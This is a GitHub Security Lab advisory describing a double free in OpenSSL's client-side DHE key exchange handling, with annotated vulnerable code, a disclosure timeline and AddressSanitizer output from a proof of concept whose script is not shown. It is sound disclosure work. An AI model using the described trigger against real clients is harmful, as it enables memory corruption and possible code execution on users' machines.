<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">March 31, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-056: Double free in OpenSSL client</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>We have identified a security issue in <code class="language-plaintext highlighter-rouge">OpenSSL</code> in which an attacker can force a client into freeing the same memory twice in the context of a key exchange between the server and the client. The fact this vulnerability happens in the key exchange process, prior to any server certificate verification, makes the vulnerability more serious since the attacker does not need to supplant the identity of the server in order to successfully exploit the vulnerability.</p>

<p>Because this issue occurs on the client side of <code class="language-plaintext highlighter-rouge">OpenSSL</code> it has a reduced impact compared with issues on the server side, but that does not make it negligible.</p>

<p><strong>The vulnerablity was fixed on the master repository before it was included in an <code class="language-plaintext highlighter-rouge">OpenSSL</code> release, for that reason we believe no projects should be currently affected. If you pull the code from master, you can check when the vulnerability was introduced on commit <a href="https://github.com/openssl/openssl/commit/ada66e78ef5">ada66e78ef5</a></strong></p>

<h2 id="product">Product</h2>

<p>OpenSSL</p>

<h2 id="tested-version">Tested Version</h2>

<p>OpenSSL master branch at commit <code class="language-plaintext highlighter-rouge">f4c88073091592b1ff92ba12c894488ff7d03ece</code>.</p>

<h2 id="details">Details</h2>

<p>The function <a href="https://github.com/openssl/openssl/blob/ada66e78ef535fe80e422bbbadffe8e7863d457c/ssl/statem/statem_clnt.c#L2083">tls_process_ske_dhe</a> contains a double-free vulnerability that can be exploited by a malicious server or a network positioned attacker that has traffic shaping capabilities.</p>

<p>In the following code snippet at (1) two heap objects are created that will later contain the information parsed from the network. At (2), the function <code class="language-plaintext highlighter-rouge">EVP_PKEY_assign_DH</code> will store a raw pointer to the <code class="language-plaintext highlighter-rouge">DH</code> object without incrementing its reference count. Then <code class="language-plaintext highlighter-rouge">ssl_security</code> will perform security checks on the recently loaded keys. If this function fails it will jump straight to (4) and free the <code class="language-plaintext highlighter-rouge">DH</code> object along with the <code class="language-plaintext highlighter-rouge">EVP_PKEY</code> object at (5). The function <code class="language-plaintext highlighter-rouge">EVP_PKEY_free</code> will internally free any resources it holds, including the raw pointer to the <code class="language-plaintext highlighter-rouge">DH</code> object freed at (4).</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define EVP_PKEY_assign_DH(pkey,dh) EVP_PKEY_assign((pkey),EVP_PKEY_DH,(dh))
</span>
<span class="kt">int</span> <span class="nf">EVP_PKEY_assign</span><span class="p">(</span><span class="n">EVP_PKEY</span> <span class="o">*</span><span class="n">pkey</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">alias</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>

<span class="cp">#ifndef OPENSSL_NO_EC
</span>    <span class="k">if</span> <span class="p">(</span><span class="n">EVP_PKEY_type</span><span class="p">(</span><span class="n">type</span><span class="p">)</span> <span class="o">==</span> <span class="n">EVP_PKEY_EC</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">const</span> <span class="n">EC_GROUP</span> <span class="o">*</span><span class="n">group</span> <span class="o">=</span> <span class="n">EC_KEY_get0_group</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">group</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">EC_GROUP_get_curve_name</span><span class="p">(</span><span class="n">group</span><span class="p">)</span> <span class="o">==</span> <span class="n">NID_sm2</span><span class="p">)</span>
            <span class="n">alias</span> <span class="o">=</span> <span class="n">EVP_PKEY_SM2</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">#endif
</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pkey</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">!</span><span class="n">EVP_PKEY_set_type</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">type</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EVP_PKEY_set_alias_type</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">alias</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">pkey</span><span class="o">-&gt;</span><span class="n">pkey</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">key</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">tls_process_ske_dhe</span><span class="p">(</span><span class="n">SSL</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="n">PACKET</span> <span class="o">*</span><span class="n">pkt</span><span class="p">,</span> <span class="n">EVP_PKEY</span> <span class="o">**</span><span class="n">pkey</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#ifndef OPENSSL_NO_DH
</span>    <span class="n">PACKET</span> <span class="n">prime</span><span class="p">,</span> <span class="n">generator</span><span class="p">,</span> <span class="n">pub_key</span><span class="p">;</span>
    <span class="n">EVP_PKEY</span> <span class="o">*</span><span class="n">peer_tmp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">DH</span> <span class="o">*</span><span class="n">dh</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">BIGNUM</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">g</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">bnpub_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">check_bits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PACKET_get_length_prefixed_2</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prime</span><span class="p">)</span>
        <span class="o">||</span> <span class="o">!</span><span class="n">PACKET_get_length_prefixed_2</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">generator</span><span class="p">)</span>
        <span class="o">||</span> <span class="o">!</span><span class="n">PACKET_get_length_prefixed_2</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pub_key</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_DECODE_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">SSL_R_LENGTH_MISMATCH</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// #1: Create a generic key and a DH object.</span>
    <span class="n">peer_tmp</span> <span class="o">=</span> <span class="n">EVP_PKEY_new</span><span class="p">();</span>
    <span class="n">dh</span> <span class="o">=</span> <span class="n">DH_new</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">peer_tmp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">dh</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">ERR_R_MALLOC_FAILURE</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* TODO(size_t): Convert these calls */</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">BN_bin2bn</span><span class="p">(</span><span class="n">PACKET_data</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prime</span><span class="p">),</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">PACKET_remaining</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prime</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">BN_bin2bn</span><span class="p">(</span><span class="n">PACKET_data</span><span class="p">(</span><span class="o">&amp;</span><span class="n">generator</span><span class="p">),</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">PACKET_remaining</span><span class="p">(</span><span class="o">&amp;</span><span class="n">generator</span><span class="p">),</span>
                  <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">bnpub_key</span> <span class="o">=</span> <span class="n">BN_bin2bn</span><span class="p">(</span><span class="n">PACKET_data</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pub_key</span><span class="p">),</span>
                          <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">PACKET_remaining</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pub_key</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">g</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">bnpub_key</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">ERR_R_BN_LIB</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* test non-zero pubkey */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">BN_is_zero</span><span class="p">(</span><span class="n">bnpub_key</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_ILLEGAL_PARAMETER</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">SSL_R_BAD_DH_VALUE</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DH_set0_pqg</span><span class="p">(</span><span class="n">dh</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">g</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">ERR_R_BN_LIB</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">g</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">DH_check_params</span><span class="p">(</span><span class="n">dh</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">check_bits</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">check_bits</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_ILLEGAL_PARAMETER</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">SSL_R_BAD_DH_VALUE</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DH_set0_key</span><span class="p">(</span><span class="n">dh</span><span class="p">,</span> <span class="n">bnpub_key</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">ERR_R_BN_LIB</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">bnpub_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// #2: Assign the DH raw pointer to the EVP_PKEY. This does not increment the reference count.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">EVP_PKEY_assign_DH</span><span class="p">(</span><span class="n">peer_tmp</span><span class="p">,</span> <span class="n">dh</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">ERR_R_EVP_LIB</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// #3: If the parameters in the EVP_PKEY are deemed insecure, err.</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ssl_security</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_SECOP_TMP_DH</span><span class="p">,</span> <span class="n">EVP_PKEY_security_bits</span><span class="p">(</span><span class="n">peer_tmp</span><span class="p">),</span>
                      <span class="mi">0</span><span class="p">,</span> <span class="n">dh</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_HANDSHAKE_FAILURE</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
                 <span class="n">SSL_R_DH_KEY_TOO_SMALL</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">s</span><span class="o">-&gt;</span><span class="n">s3</span><span class="p">.</span><span class="n">peer_tmp</span> <span class="o">=</span> <span class="n">peer_tmp</span><span class="p">;</span>

    <span class="cm">/*
     * FIXME: This makes assumptions about which ciphersuites come with
     * public keys. We should have a less ad-hoc way of doing this
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">s3</span><span class="p">.</span><span class="n">tmp</span><span class="p">.</span><span class="n">new_cipher</span><span class="o">-&gt;</span><span class="n">algorithm_auth</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">SSL_aRSA</span> <span class="o">|</span> <span class="n">SSL_aDSS</span><span class="p">))</span>
        <span class="o">*</span><span class="n">pkey</span> <span class="o">=</span> <span class="n">X509_get0_pubkey</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">peer</span><span class="p">);</span>
    <span class="cm">/* else anonymous DH, so no certificate or pkey. */</span>

    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

 <span class="nl">err:</span>
    <span class="n">BN_free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="n">BN_free</span><span class="p">(</span><span class="n">g</span><span class="p">);</span>
    <span class="n">BN_free</span><span class="p">(</span><span class="n">bnpub_key</span><span class="p">);</span>

    <span class="c1">// #4: Effectively free the DH structure.</span>
    <span class="n">DH_free</span><span class="p">(</span><span class="n">dh</span><span class="p">);</span>

    <span class="c1">// #5: Free the EVP_PKEY and the underliying DH key which was already freed.</span>
    <span class="n">EVP_PKEY_free</span><span class="p">(</span><span class="n">peer_tmp</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#else
</span>    <span class="n">SSLfatal</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SSL_AD_INTERNAL_ERROR</span><span class="p">,</span> <span class="n">SSL_F_TLS_PROCESS_SKE_DHE</span><span class="p">,</span>
             <span class="n">ERR_R_INTERNAL_ERROR</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="p">}</span>
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">EVP_PKEY_assign</span><span class="p">(</span><span class="n">EVP_PKEY</span> <span class="o">*</span><span class="n">pkey</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">alias</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>

<span class="cp">#ifndef OPENSSL_NO_EC
</span>    <span class="k">if</span> <span class="p">(</span><span class="n">EVP_PKEY_type</span><span class="p">(</span><span class="n">type</span><span class="p">)</span> <span class="o">==</span> <span class="n">EVP_PKEY_EC</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">const</span> <span class="n">EC_GROUP</span> <span class="o">*</span><span class="n">group</span> <span class="o">=</span> <span class="n">EC_KEY_get0_group</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">group</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">EC_GROUP_get_curve_name</span><span class="p">(</span><span class="n">group</span><span class="p">)</span> <span class="o">==</span> <span class="n">NID_sm2</span><span class="p">)</span>
            <span class="n">alias</span> <span class="o">=</span> <span class="n">EVP_PKEY_SM2</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">#endif
</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pkey</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">!</span><span class="n">EVP_PKEY_set_type</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">type</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EVP_PKEY_set_alias_type</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">alias</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">pkey</span><span class="o">-&gt;</span><span class="n">pkey</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">key</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="impact">Impact</h3>

<p>A malicious server may use this vulnerability to execute arbitrary code in the context of a client.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>03/27/2020: Report sent to Vendor</li>
  <li>03/27/2020: Vendor acknowledged report</li>
  <li>03/30/2020: Vendor proposed fixes</li>
  <li>03/31/2020: Fixes reviewed and verified</li>
</ul>

<h2 id="supporting-resources">Supporting Resources</h2>

<p>In the following sections you will find the code for a simple proof of concept that triggers the vulnerability by creating a fake <code class="language-plaintext highlighter-rouge">TLS</code> tcp server. Then by using <code class="language-plaintext highlighter-rouge">openssl s_client</code> we connect to said server to trigger the issue:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py
Got connection: &lt;socket.socket <span class="nv">fd</span><span class="o">=</span>6, <span class="nv">family</span><span class="o">=</span>AddressFamily.AF_INET, <span class="nb">type</span><span class="o">=</span>SocketKind.SOCK_STREAM, <span class="nv">proto</span><span class="o">=</span>0, <span class="nv">laddr</span><span class="o">=(</span><span class="s1">'127.0.0.1'</span>, 4433<span class="o">)</span>, <span class="nv">raddr</span><span class="o">=(</span><span class="s1">'127.0.0.1'</span>, 54190<span class="o">)&gt;</span>-<span class="o">(</span><span class="s1">'127.0.0.1'</span>, 54190<span class="o">)</span>
</code></pre></div></div>

<p>Now run an openssl client, such as <code class="language-plaintext highlighter-rouge">s_client</code> under a debugger:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>lldb openssl
<span class="o">(</span>lldb<span class="o">)</span> r s_client
Process 44349 launched: <span class="s1">'/Users/anon/workspace/openssl/apps/openssl'</span> <span class="o">(</span>x86_64<span class="o">)</span>
CONNECTED<span class="o">(</span>00000004<span class="o">)</span>
<span class="nv">depth</span><span class="o">=</span>0 C <span class="o">=</span> SM, CN <span class="o">=</span> Pirulo
verify error:num<span class="o">=</span>18:self signed certificate
verify <span class="k">return</span>:1
<span class="nv">depth</span><span class="o">=</span>0 C <span class="o">=</span> SM, CN <span class="o">=</span> Pirulo
verify <span class="k">return</span>:1
<span class="o">=================================================================</span>
<span class="o">==</span><span class="nv">44349</span><span class="o">==</span>ERROR: AddressSanitizer: heap-use-after-free on address 0x60f00002da40 at pc 0x000100838c01 bp 0x7ffeefbfaeb0 sp 0x7ffeefbfaea8
READ of size 8 at 0x60f00002da40 thread T0
2020-03-27 17:17:40.029610+0100 atos[44354:2368186] examining /Users/USER/<span class="k">*</span>/openssl <span class="o">[</span>44349]
2020-03-27 17:17:40.171682+0100 atos[44355:2368190] examining /Users/USER/<span class="k">*</span>/openssl <span class="o">[</span>44349]
    <span class="c">#0 0x100838c00 in DH_free dh_lib.c:133</span>
    <span class="c">#1 0x10082411d in int_dh_free dh_ameth.c:52</span>
    <span class="c">#2 0x100b3c37a in evp_pkey_free_legacy p_lib.c:1168</span>
    <span class="c">#3 0x100b3ca7d in evp_pkey_free_it p_lib.c:1187</span>
    <span class="c">#4 0x100b35f5b in EVP_PKEY_free p_lib.c:1210</span>
    <span class="c">#5 0x1003e5ba7 in tls_process_ske_dhe statem_clnt.c:2180</span>
    <span class="c">#6 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#7 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#8 0x1003add59 in read_state_machine statem.c:637</span>
    <span class="c">#9 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#10 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#11 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#12 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#13 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#14 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#15 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#16 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#17 0x100062e24 in main openssl.c:299</span>
    <span class="c">#18 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>

0x60f00002da40 is located 160 bytes inside of 176-byte region <span class="o">[</span>0x60f00002d9a0,0x60f00002da50<span class="o">)</span>
freed by thread T0 here:
    <span class="c">#0 0x10226e536 in wrap_free (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x45536)</span>
    <span class="c">#1 0x100be8608 in CRYPTO_free mem.c:252</span>
    <span class="c">#2 0x1008394ac in DH_free dh_lib.c:153</span>
    <span class="c">#3 0x1003e5b9b in tls_process_ske_dhe statem_clnt.c:2179</span>
    <span class="c">#4 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#5 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#6 0x1003add59 in read_state_machine statem.c:637</span>
    <span class="c">#7 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#8 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#9 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#10 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#11 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#12 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#13 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#14 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#15 0x100062e24 in main openssl.c:299</span>
    <span class="c">#16 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>

previously allocated by thread T0 here:
    <span class="c">#0 0x10226e3ed in wrap_malloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x453ed)</span>
    <span class="c">#1 0x100be849b in CRYPTO_malloc mem.c:184</span>
    <span class="c">#2 0x100be84d2 in CRYPTO_zalloc mem.c:191</span>
    <span class="c">#3 0x1008375c8 in dh_new_intern dh_lib.c:71</span>
    <span class="c">#4 0x100837592 in DH_new dh_lib.c:55</span>
    <span class="c">#5 0x1003e5230 in tls_process_ske_dhe statem_clnt.c:2103</span>
    <span class="c">#6 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#7 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#8 0x1003add59 in read_state_machine statem.c:637</span>
    <span class="c">#9 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#10 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#11 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#12 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#13 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#14 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#15 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#16 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#17 0x100062e24 in main openssl.c:299</span>
    <span class="c">#18 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>

SUMMARY: AddressSanitizer: heap-use-after-free dh_lib.c:133 <span class="k">in </span>DH_free
Shadow bytes around the buggy address:
  0x1c1e00005af0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x1c1e00005b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x1c1e00005b10: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
  0x1c1e00005b20: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa
  0x1c1e00005b30: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
<span class="o">=&gt;</span>0x1c1e00005b40: fd fd fd fd fd fd fd fd[fd]fd fa fa fa fa fa fa
  0x1c1e00005b50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend <span class="o">(</span>one shadow byte represents 8 application bytes<span class="o">)</span>:
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after <span class="k">return</span>:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      <span class="nb">fc
  </span>Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
<span class="o">=================================================================</span>
<span class="o">==</span><span class="nv">44349</span><span class="o">==</span>ERROR: AddressSanitizer: heap-use-after-free on address 0x60f00002da40 at pc 0x000100838c01 bp 0x7ffeefbfaeb0 sp 0x7ffeefbfaea8
READ of size 8 at 0x60f00002da40 thread T0
    <span class="c">#0 0x100838c00 in DH_free dh_lib.c:133</span>
    <span class="c">#1 0x10082411d in int_dh_free dh_ameth.c:52</span>
    <span class="c">#2 0x100b3c37a in evp_pkey_free_legacy p_lib.c:1168</span>
    <span class="c">#3 0x100b3ca7d in evp_pkey_free_it p_lib.c:1187</span>
    <span class="c">#4 0x100b35f5b in EVP_PKEY_free p_lib.c:1210</span>
    <span class="c">#5 0x1003e5ba7 in tls_process_ske_dhe statem_clnt.c:2180</span>
    <span class="c">#6 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#7 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#8 0x1003add59 in read_state_machine statem.c:637</span>
